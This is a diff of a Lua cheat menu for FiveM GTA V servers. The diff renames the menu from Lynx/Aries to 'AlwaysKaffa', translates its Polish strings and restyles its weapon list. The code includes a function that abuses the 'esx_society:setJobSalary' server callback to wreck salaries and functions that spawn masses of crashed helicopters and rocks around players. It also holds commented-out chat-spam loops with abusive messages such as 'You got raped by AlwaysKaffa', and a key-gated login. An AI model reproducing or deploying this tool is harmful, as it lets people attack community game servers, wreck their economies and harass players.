+                        name = '~h~~p~» ~s~Armor Piercing Rounds',
                         id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
                     },
                     {
-                        name = '~h~~r~> ~s~Explosive Rounds',
+                        name = '~h~~p~» ~s~Explosive Rounds',
                         id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Zoom Scope',
+                        name = '~h~~p~» ~s~Zoom Scope',
                         id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Advanced Scope',
+                        name = '~h~~p~» ~s~Advanced Scope',
                         id = 'COMPONENT_AT_SCOPE_MAX'
                     },
                     {
-                        name = '~h~~r~> ~s~Nigt Vision Scope',
+                        name = '~h~~p~» ~s~Nigt Vision Scope',
                         id = 'COMPONENT_AT_SCOPE_NV'
                     },
                     {
-                        name = '~h~~r~> ~s~Thermal Scope',
+                        name = '~h~~p~» ~s~Thermal Scope',
                         id = 'COMPONENT_AT_SCOPE_THERMAL'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_SR_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_SR_BARREL_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_SR_SUPP_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Squared Muzzle Brake',
+                        name = '~h~~p~» ~s~Squared Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_08'
                     },
                     {
-                        name = '~h~~r~> ~s~Bell-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Bell-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_09'
                     }
                 }
@@ -3466,40 +3474,40 @@ local b7 = {
         },
         MarksmanRifle = {
             id = 'weapon_marksmanrifle',
-            name = '~h~~r~> ~s~Marksman Rifle',
+            name = '~h~~p~» ~s~Marksman Rifle',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -3507,102 +3515,102 @@ local b7 = {
         },
         MarksmanRifleMkII = {
             id = 'weapon_marksmanrifle_mk2',
-            name = '~h~~r~> ~s~Marksman Rifle Mk II',
+            name = '~h~~p~» ~s~Marksman Rifle Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Large Scope',
+                        name = '~h~~p~» ~s~Large Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Zoom Scope',
+                        name = '~h~~p~» ~s~Zoom Scope',
                         id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_MRFL_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_MRFL_BARREL_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     },
                     {
-                        name = '~h~~r~> ~s~Flat Muzzle Brake',
+                        name = '~h~~p~» ~s~Flat Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
+                        name = '~h~~p~» ~s~Tactical Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Fat-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Precision Muzzle Brake',
+                        name = '~h~~p~» ~s~Precision Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_04'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
+                        name = '~h~~p~» ~s~Heavy Duty Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_05'
                     },
                     {
-                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
+                        name = '~h~~p~» ~s~Slanted Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_06'
                     },
                     {
-                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Split-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_07'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP_02'
                     }
                 }
@@ -3612,55 +3620,55 @@ local b7 = {
     Heavy = {
         RPG = {
             id = 'weapon_rpg',
-            name = '~h~~r~> ~s~RPG',
+            name = '~h~~p~» ~s~RPG',
             bInfAmmo = false,
             mods = {}
         },
         GrenadeLauncher = {
             id = 'weapon_grenadelauncher',
-            name = '~h~~r~> ~s~Grenade Launcher',
+            name = '~h~~p~» ~s~Grenade Launcher',
             bInfAmmo = false,
             mods = {}
         },
         GrenadeLauncherSmoke = {
             id = 'weapon_grenadelauncher_smoke',
-            name = '~h~~r~> ~s~Grenade Launcher Smoke',
+            name = '~h~~p~» ~s~Grenade Launcher Smoke',
             bInfAmmo = false,
             mods = {}
         },
         Minigun = {
             id = 'weapon_minigun',
-            name = '~h~~r~> ~s~Minigun',
+            name = '~h~~p~» ~s~Minigun',
             bInfAmmo = false,
             mods = {}
         },
         FireworkLauncher = {
             id = 'weapon_firework',
-            name = '~h~~r~> ~s~Firework Launcher',
+            name = '~h~~p~» ~s~Firework Launcher',
             bInfAmmo = false,
             mods = {}
         },
         Railgun = {
             id = 'weapon_railgun',
-            name = '~h~~r~> ~s~Railgun',
+            name = '~h~~p~» ~s~Railgun',
             bInfAmmo = false,
             mods = {}
         },
         HomingLauncher = {
             id = 'weapon_hominglauncher',
-            name = '~h~~r~> ~s~Homing Launcher',
+            name = '~h~~p~» ~s~Homing Launcher',
             bInfAmmo = false,
             mods = {}
         },
         CompactGrenadeLauncher = {
             id = 'weapon_compactlauncher',
-            name = '~h~~r~> ~s~Compact Grenade Launcher',
+            name = '~h~~p~» ~s~Compact Grenade Launcher',
             bInfAmmo = false,
             mods = {}
         },
         Widowmaker = {
             id = 'weapon_rayminigun',
-            name = '~h~~r~> ~s~Widowmaker',
+            name = '~h~~p~» ~s~Widowmaker',
             bInfAmmo = false,
             mods = {}
         }
@@ -3668,61 +3676,61 @@ local b7 = {
     Throwables = {
         Grenade = {
             id = 'weapon_grenade',
-            name = '~h~~r~> ~s~Grenade',
+            name = '~h~~p~» ~s~Grenade',
             bInfAmmo = false,
             mods = {}
         },
         BZGas = {
             id = 'weapon_bzgas',
-            name = '~h~~r~> ~s~BZ Gas',
+            name = '~h~~p~» ~s~BZ Gas',
             bInfAmmo = false,
             mods = {}
         },
         MolotovCocktail = {
             id = 'weapon_molotov',
-            name = '~h~~r~> ~s~Molotov Cocktail',
+            name = '~h~~p~» ~s~Molotov Cocktail',
             bInfAmmo = false,
             mods = {}
         },
         StickyBomb = {
             id = 'weapon_stickybomb',
-            name = '~h~~r~> ~s~Sticky Bomb',
+            name = '~h~~p~» ~s~Sticky Bomb',
             bInfAmmo = false,
             mods = {}
         },
         ProximityMines = {
             id = 'weapon_proxmine',
-            name = '~h~~r~> ~s~Proximity Mines',
+            name = '~h~~p~» ~s~Proximity Mines',
             bInfAmmo = false,
             mods = {}
         },
         Snowballs = {
             id = 'weapon_snowball',
-            name = '~h~~r~> ~s~Snowballs',
+            name = '~h~~p~» ~s~Snowballs',
             bInfAmmo = false,
             mods = {}
         },
         PipeBombs = {
             id = 'weapon_pipebomb',
-            name = '~h~~r~> ~s~Pipe Bombs',
+            name = '~h~~p~» ~s~Pipe Bombs',
             bInfAmmo = false,
             mods = {}
         },
         Baseball = {
             id = 'weapon_ball',
-            name = '~h~~r~> ~s~Baseball',
+            name = '~h~~p~» ~s~Baseball',
             bInfAmmo = false,
             mods = {}
         },
         TearGas = {
             id = 'weapon_smokegrenade',
-            name = '~h~~r~> ~s~Tear Gas',
+            name = '~h~~p~» ~s~Tear Gas',
             bInfAmmo = false,
             mods = {}
         },
         Flare = {
             id = 'weapon_flare',
-            name = '~h~~r~> ~s~Flare',
+            name = '~h~~p~» ~s~Flare',
             bInfAmmo = false,
             mods = {}
         }
@@ -3730,13 +3738,13 @@ local b7 = {
     Misc = {
         Parachute = {
             id = 'gadget_parachute',
-            name = '~h~~r~> ~s~Parachute',
+            name = '~h~~p~» ~s~Parachute',
             bInfAmmo = false,
             mods = {}
         },
         FireExtinguisher = {
             id = 'weapon_fireextinguisher',
-            name = '~h~~r~> ~s~Fire Extinguisher',
+            name = '~h~~p~» ~s~Fire Extinguisher',
             bInfAmmo = false,
             mods = {}
         }
@@ -4425,7 +4433,6 @@ local br = {
         id = 112
     }
 }
-local bs = '~u~Aries ~s~Menu'
 local bt = {
     {
         name = '~h~Black',
@@ -4530,7 +4537,7 @@ local bu = {
         id = 159
     }
 }
-defaultVehAction = ''
+
 if GetVehiclePedIsUsing(PlayerPedId()) then
     veh = GetVehiclePedIsUsing(PlayerPedId())
 end
@@ -4538,7 +4545,7 @@ local bv = false
 local bw = true
 local bx = GetPlayerServerId(PlayerPedId(-1))
 local by = GetPlayerName(bx)
-av('~h~Witam witam', true)
+av('~h~Hey me name AlwaysKaffa(eta) - 5391', true)
 local function bz(I, x, y)
     SetTextFont(0)
     SetTextProportional(1)
@@ -4561,7 +4568,7 @@ function RequestModelSync(bA)
     end
 end
 
-function EconomyDy2()
+function EconomyDestroySalary1()
     if ESX then
         ESX.TriggerServerCallback(
             'esx_society:setJobSalary',
@@ -4800,24 +4807,25 @@ function PolicePlayers()
         )
     end
 end
-local bC = 0
-capPa = 'd' .. 'o' .. 'k' .. 'i'
-cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
-local bD = cappA
-local function bE()
-    if bC == 3 then
+
+local cb = 0
+local function TmEM1U()
+    if cb == 3 then
+        drawNotification("~h~Login failed, AlwaysKaffa Disabled!.")
+        Citizen.Wait(5000)
         ForceSocialClubUpdate()
     else
-        local ak = KeyboardInput('Get your password from #lynx-announcements', '', 100)
-        if ak == bD then
-            mhaonn = true
+        local YVT2dT = KeyboardInput('Enter Key', '', 100)
+        if YVT2dT == wtB2JF then
+            H4tuf5 = true
             PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
             Citizen.Wait(100)
             PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
             Citizen.Wait(100)
             PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
         else
-            bC = bC + 1
+            cb = cb + 1
+            drawNotification('~r~~h~Invalid key.')
             PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
         end
     end
@@ -5136,18 +5144,18 @@ end
 function bananapartyall()
     Citizen.CreateThread(
         function()
-            for bD = 0, 9 do
+            --[[for bD = 0, 9 do
                 TriggerServerEvent(
                     '_chat:messageEntered',
-                    'xaxaxaxaxaxaxaxaxax',
+                    '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
                     {
                         141,
                         211,
                         255
                     },
-                    '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
+                    '^' .. bD .. 'AlwaysKaffa ~ 5391'
                 )
-            end
+            end--]]
             for i = 0, 128 do
                 local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                 local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
@@ -5254,18 +5262,18 @@ local function bP(bQ, bR)
 end
 
 function RapeAllFunc()
-    for bD = 0, 9 do
+    --[[for bD = 0, 9 do
         TriggerServerEvent(
             '_chat:messageEntered',
-            'xaxaxaxaxaxaxaxaxax',
+            '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
             {
                 141,
                 211,
                 255
             },
-            '^' .. bD .. 'Rucham ci matke z ariesem <3'
+            '^' .. bD .. 'You got raped by AlwaysKaffa'
         )
-    end
+    end--]]
     Citizen.CreateThread(
         function()
             for i = 0, 128 do
@@ -5333,16 +5341,16 @@ local function bT()
         end
         if entity then
             SetEntityCoords(entity, bU + 0.5, bV + 0.5, bW + 0.5, 1, 0, 0, 1)
-            av('~g~Przeteleportowano!', false)
+            av('~g~Teleported to coords!', false)
         end
     else
-        av('~b~Nieprawidlowe koordynaty!', true)
+        av('~b~Invalid coords!', true)
     end
 end
 local function bX()
-    local name = KeyboardInput('Wprowadz nazwe blipa', '', 100)
+    local name = KeyboardInput('Enter Blip Name', '', 100)
     if name == '' then
-        av('~b~Nieprawidlowa nazwa!', true)
+        av('~b~Invalid Blip Name!', true)
         return bX()
     else
         local bU = KeyboardInput('Enter X pos', '', 100)
@@ -5367,7 +5375,7 @@ local function bX()
                 EndTextCommandSetBlipName(bZ.blip)
             end
         else
-            av('~b~Nieprawidlowe koordynaty!', true)
+            av('~b~Invalid coords!', true)
         end
     end
 end
@@ -5378,10 +5386,10 @@ local function b_()
     local c2 = GetEntityCoords(c1, true)
     local c3 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 16384)
     local c4 = GetEntityCoords(c3, true)
-    av('~y~Czekaj...', false)
+    av('~y~Wait...', false)
     Citizen.Wait(1000)
     if c1 == 0 and c3 == 0 then
-        av('~b~Pojazd nieznaleziony', true)
+        av('~b~No Vehicle Found', true)
     elseif c1 == 0 and c3 ~= 0 then
         if IsVehicleSeatFree(c3, -1) then
             SetPedIntoVehicle(ax, c3, -1)
@@ -5398,7 +5406,7 @@ local function b_()
             SetVehicleDoorsLocked(c3, 1)
             SetVehicleNeedsToBeHotwired(c3, false)
         end
-        av('~g~Teleportowano do najblizszego pojazdu!', false)
+        av('~g~Teleported Into Nearest Vehicle!', false)
     elseif c1 ~= 0 and c3 == 0 then
         if IsVehicleSeatFree(c1, -1) then
             SetPedIntoVehicle(ax, c1, -1)
@@ -5415,7 +5423,7 @@ local function b_()
             SetVehicleDoorsLocked(c1, 1)
             SetVehicleNeedsToBeHotwired(c1, false)
         end
-        av('~g~Teleportowano do najblizszego pojazdu!', false)
+        av('~g~Teleported Into Nearest Vehicle!', false)
     elseif c1 ~= 0 and c3 ~= 0 then
         if Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) < Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
             if IsVehicleSeatFree(c1, -1) then
@@ -5450,7 +5458,7 @@ local function b_()
                 SetVehicleNeedsToBeHotwired(c3, false)
             end
         end
-        av('~g~Teleportowano do najblizszego pojazdu!', false)
+        av('~g~Teleported Into Nearest Vehicle!', false)
     end
 end
 local function c6()
@@ -5460,7 +5468,7 @@ local function c6()
         WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
         wp = true
     else
-        av('~b~Brak znacznika na mapie!', true)
+        av('~b~No waypoint!', true)
     end
     local c8 = 0.0
     height = 1000.0
@@ -5488,14 +5496,14 @@ local function c6()
                 wp = false
                 height = 1000.0
                 c8 = 0.0
-                av('~g~Przeteleportowano!', false)
+                av('~g~Teleported to waypoint!', false)
                 break
             end
         end
     end
 end
 local function ca()
-    local cb = KeyboardInput('Wprowadz nazwe pojazdu', '', 100)
+    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
     if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
         RequestModel(cb)
         while not HasModelLoaded(cb) do
@@ -5511,7 +5519,7 @@ local function ca()
         )
         SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
     else
-        av('~b~~h~Model nie istnieje!', true)
+        av('~b~~h~Model is not valid!', true)
     end
 end
 local function cc()
@@ -5528,109 +5536,109 @@ local function cd()
     SetVehicleUndriveable(vehicle, false)
 end
 local function ce()
-    LynxEvo.StartRC()
+    AlwaysKaffa.StartRC()
 end
-LynxEvo.StartRC = function()
-    if DoesEntityExist(LynxEvo.Entity) then
+AlwaysKaffa.StartRC = function()
+    if DoesEntityExist(AlwaysKaffa.Entity) then
         return
     end
-    LynxEvo.SpawnRC()
-    LynxEvo.Tablet(true)
-    while DoesEntityExist(LynxEvo.Entity) and DoesEntityExist(LynxEvo.Driver) do
+    AlwaysKaffa.SpawnRC()
+    AlwaysKaffa.Tablet(true)
+    while DoesEntityExist(AlwaysKaffa.Entity) and DoesEntityExist(AlwaysKaffa.Driver) do
         Citizen.Wait(5)
-        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true)
-        LynxEvo.DrawInstructions(cf)
-        LynxEvo.HandleKeys(cf)
+        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(AlwaysKaffa.Entity), true)
+        AlwaysKaffa.DrawInstructions(cf)
+        AlwaysKaffa.HandleKeys(cf)
         if cf <= 3000.0 then
-            if not NetworkHasControlOfEntity(LynxEvo.Driver) then
-                NetworkRequestControlOfEntity(LynxEvo.Driver)
-            elseif not NetworkHasControlOfEntity(LynxEvo.Entity) then
-                NetworkRequestControlOfEntity(LynxEvo.Entity)
+            if not NetworkHasControlOfEntity(AlwaysKaffa.Driver) then
+                NetworkRequestControlOfEntity(AlwaysKaffa.Driver)
+            elseif not NetworkHasControlOfEntity(AlwaysKaffa.Entity) then
+                NetworkRequestControlOfEntity(AlwaysKaffa.Entity)
             end
         else
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 6, 2500)
         end
     end
 end
-LynxEvo.HandleKeys = function(cf)
+AlwaysKaffa.HandleKeys = function(cf)
     if IsControlJustReleased(0, 47) then
-        if IsCamRendering(LynxEvo.Camera) then
-            LynxEvo.ToggleCamera(false)
+        if IsCamRendering(AlwaysKaffa.Camera) then
+            AlwaysKaffa.ToggleCamera(false)
         else
-            LynxEvo.ToggleCamera(true)
+            AlwaysKaffa.ToggleCamera(true)
         end
     end
     if cf <= 3.0 then
         if IsControlJustPressed(0, 38) then
-            LynxEvo.Attach('pick')
+            AlwaysKaffa.Attach('pick')
         end
     end
     if cf < 3000.0 then
         if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 9, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 9, 1)
         end
         if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 6, 2500)
         end
         if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 22, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 22, 1)
         end
         if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 13, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 13, 1)
         end
         if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 14, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 14, 1)
         end
         if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 30, 100)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 30, 100)
         end
         if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 7, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 7, 1)
         end
         if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 8, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 8, 1)
         end
         if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 4, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 4, 1)
         end
         if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-            TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 5, 1)
+            TaskVehicleTempAction(AlwaysKaffa.Driver, AlwaysKaffa.Entity, 5, 1)
         end
         if IsControlJustReleased(0, 168) then
-            SetVehicleEngineOn(LynxEvo.Entity, not GetIsVehicleEngineRunning(LynxEvo.Entity), false, true)
+            SetVehicleEngineOn(AlwaysKaffa.Entity, not GetIsVehicleEngineRunning(AlwaysKaffa.Entity), false, true)
         end
     end
 end
-LynxEvo.DrawInstructions = function(cf)
+AlwaysKaffa.DrawInstructions = function(cf)
     local cg = {
         {
-            ['label'] = 'Prawo',
+            ['label'] = 'Right',
             ['button'] = '~INPUT_CELLPHONE_RIGHT~'
         },
         {
-            ['label'] = 'Do przodu',
+            ['label'] = 'Forward',
             ['button'] = '~INPUT_CELLPHONE_UP~'
         },
         {
-            ['label'] = 'Do tylu',
+            ['label'] = 'Reverse',
             ['button'] = '~INPUT_CELLPHONE_DOWN~'
         },
         {
-            ['label'] = 'Lewo',
+            ['label'] = 'Left',
             ['button'] = '~INPUT_CELLPHONE_LEFT~'
         }
     }
     local ch = {
-        ['label'] = 'Usun samochod',
+        ['label'] = 'Delete Car',
         ['button'] = '~INPUT_CONTEXT~'
     }
     local cj = {
         {
-            ['label'] = 'Przelacz kamere',
+            ['label'] = 'Toggle Camera',
             ['button'] = '~INPUT_DETONATE~'
         },
         {
-            ['label'] = 'Odpal/Zgas silnik',
+            ['label'] = 'Start/Stop Engine',
             ['button'] = '~INPUT_SELECT_CHARACTER_TREVOR~'
         }
     }
@@ -5667,14 +5675,14 @@ LynxEvo.DrawInstructions = function(cf)
         end
     )
 end
-LynxEvo.SpawnRC = function()
-    local cb = KeyboardInput('Wprowadz nazwe pojazdu', '', 100)
+AlwaysKaffa.SpawnRC = function()
+    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
     if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
         RequestModel(cb)
         while not HasModelLoaded(cb) do
             Citizen.Wait(0)
         end
-        LynxEvo.LoadModels(
+        AlwaysKaffa.LoadModels(
             {
                 GetHashKey(cb),
                 68070371
@@ -5683,37 +5691,37 @@ LynxEvo.SpawnRC = function()
         local co, cp =
             GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
             GetEntityHeading(PlayerPedId())
-        LynxEvo.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
-        while not DoesEntityExist(LynxEvo.Entity) do
+        AlwaysKaffa.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
+        while not DoesEntityExist(AlwaysKaffa.Entity) do
             Citizen.Wait(5)
         end
-        LynxEvo.Driver = CreatePed(5, 68070371, co, cp, true)
-        SetEntityInvincible(LynxEvo.Driver, true)
-        SetEntityVisible(LynxEvo.Driver, false)
-        FreezeEntityPosition(LynxEvo.Driver, true)
-        SetPedAlertness(LynxEvo.Driver, 0.0)
-        TaskWarpPedIntoVehicle(LynxEvo.Driver, LynxEvo.Entity, -1)
-        while not IsPedInVehicle(LynxEvo.Driver, LynxEvo.Entity) do
+        AlwaysKaffa.Driver = CreatePed(5, 68070371, co, cp, true)
+        SetEntityInvincible(AlwaysKaffa.Driver, true)
+        SetEntityVisible(AlwaysKaffa.Driver, false)
+        FreezeEntityPosition(AlwaysKaffa.Driver, true)
+        SetPedAlertness(AlwaysKaffa.Driver, 0.0)
+        TaskWarpPedIntoVehicle(AlwaysKaffa.Driver, AlwaysKaffa.Entity, -1)
+        while not IsPedInVehicle(AlwaysKaffa.Driver, AlwaysKaffa.Entity) do
             Citizen.Wait(0)
         end
-        LynxEvo.Attach('place')
-        av('~g~~h~Sukces :)', false)
+        AlwaysKaffa.Attach('place')
+        av('~g~~h~Success', false)
     else
-        av('~b~~h~Model pojazdu nie istnieje !', true)
+        av('~b~~h~Model is not valid !', true)
     end
 end
-LynxEvo.Attach = function(aw)
-    if not DoesEntityExist(LynxEvo.Entity) then
+AlwaysKaffa.Attach = function(aw)
+    if not DoesEntityExist(AlwaysKaffa.Entity) then
         return
     end
-    LynxEvo.LoadModels(
+    AlwaysKaffa.LoadModels(
         {
             'pickup_object'
         }
     )
     if aw == 'place' then
         AttachEntityToEntity(
-            LynxEvo.Entity,
+            AlwaysKaffa.Entity,
             PlayerPedId(),
             GetPedBoneIndex(PlayerPedId(), 28422),
             3.0,
@@ -5730,35 +5738,35 @@ LynxEvo.Attach = function(aw)
             1
         )
         Citizen.Wait(200)
-        DetachEntity(LynxEvo.Entity, false, true)
-        PlaceObjectOnGroundProperly(LynxEvo.Entity)
+        DetachEntity(AlwaysKaffa.Entity, false, true)
+        PlaceObjectOnGroundProperly(AlwaysKaffa.Entity)
     elseif aw == 'pick' then
-        if DoesCamExist(LynxEvo.Camera) then
-            LynxEvo.ToggleCamera(false)
+        if DoesCamExist(AlwaysKaffa.Camera) then
+            AlwaysKaffa.ToggleCamera(false)
         end
-        LynxEvo.Tablet(false)
+        AlwaysKaffa.Tablet(false)
         Citizen.Wait(100)
-        DetachEntity(LynxEvo.Entity)
-        DeleteVehicle(LynxEvo.Entity)
-        DeleteEntity(LynxEvo.Driver)
-        LynxEvo.UnloadModels()
+        DetachEntity(AlwaysKaffa.Entity)
+        DeleteVehicle(AlwaysKaffa.Entity)
+        DeleteEntity(AlwaysKaffa.Driver)
+        AlwaysKaffa.UnloadModels()
     end
 end
-LynxEvo.Tablet = function(cq)
+AlwaysKaffa.Tablet = function(cq)
     if cq then
-        LynxEvo.LoadModels(
+        AlwaysKaffa.LoadModels(
             {
